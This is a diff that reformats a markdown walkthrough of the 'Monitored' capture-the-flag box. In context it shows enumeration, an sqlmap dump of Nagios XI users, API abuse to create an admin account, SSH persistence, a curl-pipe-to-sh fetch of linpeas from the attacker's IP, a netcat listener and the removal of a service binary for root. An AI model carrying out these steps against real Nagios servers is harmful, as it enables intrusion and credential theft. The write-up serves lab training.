@@ -19,7 +19,8 @@ description: "Monitored - A walkthrough of the challenge with enumeration, explo
 
 ![image2](../resources/e6df9cb7edd8466d968c4c49a08621c8.png)
 
-- UDP Scan
+- UDP Scan:
+
 ```bash
 sudo nmap nagios.monitored.htb -sU -vvv
 
@@ -35,6 +36,7 @@ sudo nmap nagios.monitored.htb -sU -vvv
 ![image5](../resources/3af82cbb6a11423cb3f8583570ed4c75.png)
 
 - Directory bruteforcing:
+
 ```bash
 ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
@@ -43,6 +45,7 @@ ffuf -u https://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbu
 ![image6](../resources/bc900ed4da4b4fd39323f7aeef86e354.png)
 
 - FUZZ /api
+
 ```bash
 ffuf -u https://nagios.monitored.htb/nagiosxi/api/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
@@ -63,6 +66,7 @@ ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlist
 ![image9](../resources/b9798d5323c44d9ca9b6979b59630b1c.png)
 
 - Filter:
+
 ```bash
 ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 4
 
@@ -71,6 +75,7 @@ ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlist
 ![image10](../resources/0fd8e28137c646f0926de32d8e84d801.png)
 
 - **Incorrectly** formatted POST request:
+
 ```bash
 curl -X POST -H "Content-Type: application/json" -d '{"test": "test"}' -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
 
@@ -130,6 +135,7 @@ sudo nano /etc/snmp/snmp.conf #comment out mibs
 ![image18](../resources/b3760f29f86c4d0e9288e23feaa33d69.png)
 
 - Let snmpwalk run and output to a file:
+
 ```bash
 snmpwalk -c public 10.129.230.96 -v 1 > snmp.txt
 
@@ -195,6 +201,7 @@ Auth_token: **815a6e02614c74f9bce2bd585298b5efa0858d6d**
 ![image27](../resources/71e6009872a44892a82fc31549a995b4.png)
 
 - It needs to be a cookie of an authenticated user
+
 ```bash
 sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="action=acknowledge_banner_message&id=3" --cookie "nagiosxi=q0mkm8crf2a3rckum3enqgafje" --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump
 
@@ -260,6 +267,7 @@ But it's just a user
 Auth_level is by default = user
 
 - Change auth_level = admin:
+
 ```bash
 curl -X POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin&password=admin&auth_level=admin&name=john%20smit&email=john2@localhost"
 
@@ -310,12 +318,13 @@ Choose the command we made
 in Services, choose your service and click Run Check Command and stop the command after you get a shell
 
 - To get a better shell:
+
 ```bash
 ssh-keygen -t rsa -b 4096
 
 chmod 600 id_rsa
 
-echo "id_rsa.pub" \> .ssh/authorized_keys
+echo "id_rsa.pub" > .ssh/authorized_keys
 
 ssh nagios@10.129.230.96 -i id_rsa
 
@@ -332,7 +341,8 @@ sudo -l
 
 ![image44](../resources/7ed1a3f29edb426cbe4867e5eadd6adf.png)
 
-- Upload linpeas
+- Upload linpeas:
+
 ```bash
 curl http://10.10.14.38:8082/linpeas.sh | sh
 
@@ -341,6 +351,7 @@ curl http://10.10.14.38:8082/linpeas.sh | sh
 ![image45](../resources/20e33d20de5a4343b29ba0fade487521.png)
 
 - Looking at the services from linpeas:
+
 ```bash
 systemctl status nagios.service
 
@@ -363,12 +374,14 @@ We can see that it's a script that basically does what systemctl does - starts a
 
 **Everything in Linux is a file**
 
-- Set up listener
+- Set up listener:
+
 ```bash
 rlwrap -cAr nc -lvnp 9001
 
 ```
 - Do the following:
+
 ```bash
 rm -rf /usr/local/nagios/bin/npcd
 
